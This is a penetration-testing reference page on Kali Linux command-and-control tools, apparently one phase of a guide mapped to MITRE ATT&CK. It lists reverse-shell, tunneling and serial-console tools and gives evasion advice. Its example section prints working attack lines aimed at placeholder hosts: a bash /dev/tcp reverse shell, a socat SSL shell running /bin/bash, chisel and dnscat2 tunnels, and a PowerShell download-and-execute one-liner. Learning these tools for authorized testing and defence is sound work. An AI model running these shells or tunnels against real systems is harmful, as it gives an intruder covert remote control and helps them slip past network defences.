---
title: "Phase 12: Command and Control"
description: "Kali Linux Command and Control tools for reverse shells, tunneling, serial console access, and C2 channel establishment"
mitre_tactic: "Command and Control"
mitre_tactic_id: "TA0011"
---

# Phase 12: Command and Control

## Overview

Command and Control (C2) infrastructure forms the backbone of post-exploitation operations. Once initial access is achieved on a target system, C2 tools enable persistent bidirectional communication between the attacker infrastructure and compromised hosts. This phase covers the tools and techniques required to establish, maintain, and secure C2 channels across diverse network environments.

The MITRE ATT&CK framework defines Command and Control as the means by which adversaries communicate with systems under their control. C2 channels must evade detection, survive network disruptions, and provide reliable access for operational commands, data exfiltration, and lateral movement.

## Categories

### Reverse Shells

Reverse shells initiate outbound connections from a compromised host back to attacker-controlled infrastructure. They bypass inbound firewall rules by leveraging the target's ability to make outbound connections.

| Tool | Description | Language |
|------|-------------|----------|
| ncat | Nmap's netcat implementation with SSL support | C |
| netcat | Classic TCP/IP swiss army knife | C |
| penelope | Advanced reverse shell handler with session management | Python |
| powercat | PowerShell netcat for Windows environments | PowerShell |
| sbd | Secure backdoor with encryption | C |
| socat | Multipurpose relay for bidirectional data transfer | C |

### Serial Console Access

Direct hardware-level access for interacting with embedded devices, routers, switches, and other equipment through serial interfaces.

| Tool | Description |
|------|-------------|
| minicom | Terminal program for serial communication |

### Tunneling and Port Forwarding

Tunneling tools encapsulate traffic within other protocols to traverse network restrictions, establish covert channels, or pivot through compromised hosts.

| Tool | Description | Protocol |
|------|-------------|----------|
| chisel | Fast TCP/UDP tunnel over HTTP | HTTP/WebSocket |
| dns2tcp | TCP over DNS tunneling | DNS |
| dnscat2 | DNS tunnel for encrypted C2 | DNS |
| iodine | IPv4 data tunnel through DNS | DNS |
| ligolo-ng | TUN interface tunneling tool | TCP/TLS |
| miredo | Teredo IPv6 tunneling | IPv6/Teredo |
| proxychains-ng | SOCKS/HTTP proxy chaining | SOCKS/HTTP |
| proxytunnel | HTTP CONNECT tunneling | HTTP |
| ptunnel | ICMP tunneling | ICMP |
| pwnat | NAT traversal without port forwarding | UDP |
| sshuttle | Transparent VPN over SSH | SSH |
| sslh | Protocol multiplexer for TLS | TLS |
| stunnel4 | Universal SSL tunnel wrapper | SSL/TLS |
| udptunnel | UDP encapsulation over TCP | UDP/TCP |

## MITRE ATT&CK Mapping

| Technique | ID | Description | Tools |
|-----------|-----|-------------|-------|
| Application Layer Protocol | T1071 | C2 over HTTP, DNS, SMTP | chisel, dnscat2, iodine |
| Encrypted Channel | T1573 | Encrypted C2 communications | socat, stunnel4, sbd |
| Non-Application Layer Protocol | T1095 | C2 over raw TCP/UDP | netcat, ncat |
| Protocol Tunneling | T1572 | Tunneling through restrictive networks | All tunneling tools |
| Proxy | T1090 | Multi-hop proxy chains | proxychains-ng, sshuttle |
| Web Protocols | T1071.001 | C2 over HTTP/HTTPS | chisel, proxytunnel |

## Installation

All tools in this phase are available through the Kali Linux repositories:

```bash
# Reverse shells
sudo apt install ncat netcat-traditional socat sbd

# Serial console
sudo apt install minicom

# Tunneling
sudo apt install chisel dns2tcp dnscat2 iodine miredo proxychains-ng proxytunnel ptunnel sshuttle sslh stunnel4 udptunnel
```

For ligolo-ng, download from GitHub releases:

```bash
# Download ligolo-ng proxy and agent
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
```

For powercat, import from PowerShell:

```powershell
# Import powercat
IEX (New-Object System.Net.WebClient).DownloadString('http://YOUR_IP/powercat.ps1')
```

## Usage Guidelines

### Operational Security

- **Encryption**: Always use encrypted channels (socat SSL, chisel, stunnel4) when operational security is critical. Unencrypted reverse shells transmit data in cleartext.
- **DNS Tunneling**: DNS-based tools (dnscat2, iodine, dns2tcp) provide the highest evasion capability but lower bandwidth. Use when TCP/UDP egress is blocked.
- **Proxy Chains**: Chain multiple proxies (proxychains-ng + sshuttle) to obscure the true origin of C2 traffic.
- **Traffic Blending**: Chisel's HTTP transport and sslh's protocol multiplexing make C2 traffic blend with legitimate traffic.

### Network Considerations

- **Firewalls**: Use reverse shells over standard ports (443, 80) for maximum egress success.
- **IDS/IPS**: Encrypted channels (SSL/TLS) defeat deep packet inspection but may trigger anomaly detection on unusual ports.
- **Proxy Environments**: HTTP CONNECT tunnels (proxytunnel) and SOCKS proxies (proxychains-ng) work through corporate proxy infrastructure.
- **Restricted Networks**: DNS tunneling (dnscat2, iodine) bypasses most network restrictions when only DNS resolution is permitted.

### Reliability

- **Connection Persistence**: Chisel provides automatic reconnection with exponential backoff. Netcat requires external handling.
- **Session Management**: Penelope and dnscat2 provide interactive session management for multiple simultaneous connections.
- **Heartbeats**: Configure keepalive mechanisms to maintain long-lived C2 channels through NAT devices and stateful firewalls.

## Common Attack Patterns

### Basic Reverse Shell (netcat)

```bash
# Attacker listener
nc -lvnp 4444

# Target (bash reverse shell)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Encrypted C2 via SSL (socat)

```bash
# Generate certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# Connect
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash
```

### HTTP Tunnel (chisel)

```bash
# Server
chisel server -p 8080 --reverse

# Client
chisel client ATTACKER_IP:8080 R:8081:127.0.0.1:80
```

### DNS C2 Channel (dnscat2)

```bash
# Server (on authoritative DNS)
dnscat2 --dns server=0.0.0.0 port=53 --secret=YOUR_SECRET example.com

# Client (on target)
dnscat2 example.com --secret=YOUR_SECRET
```

### Transparent VPN (sshuttle)

```bash
# Route entire subnet through SSH
sshuttle -r user@attacker 10.0.0.0/8
```

## Tool Selection Matrix

| Scenario | Recommended Tool | Rationale |
|----------|-----------------|-----------|
| Quick shell, no restrictions | netcat / ncat | Simple, fast, no dependencies |
| Encrypted shell required | socat (SSL) | Native SSL support, bidirectional |
| Windows target | powercat | PowerShell native, no EXE drop |
| Persistent C2 channel | chisel | Auto-reconnect, multiplexed tunnels |
| DNS-only egress | dnscat2 / iodine | Works with only DNS resolution |
| Full network pivoting | ligolo-ng | TUN interface, no SOCKS needed |
| Corporate proxy environment | proxychains-ng + sshuttle | Chains through existing proxies |
| Hardware device access | minicom | Serial console, device firmware |
| Encrypt legacy services | stunnel4 | Wraps TCP services in TLS |
| Multiple protocols on one port | sslh | Demultiplexes TLS/SSH/HTTP |

## Related Phases

- **Phase 11**: Post-Exploitation — Establishing access before C2 setup
- **Phase 13**: Data Exfiltration — Moving data out through C2 channels
- **Phase 14**: Lateral Movement — Pivoting from initial compromise

## Resources

- [MITRE ATT&CK: Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [Kali Linux Tools](https://www.kali.org/tools/)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)
- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [dnscat2 GitHub Repository](https://github.com/iagox86/dnscat2)
- [Ligolo-ng Documentation](https://docs.ligolo.ng/)
- [Proxychains-ng GitHub](https://github.com/rofl0r/proxychains-ng)
- [Socat Manual](http://www.dest-unreach.org/socat/)
- [stunnel Documentation](https://www.stunnel.org/)
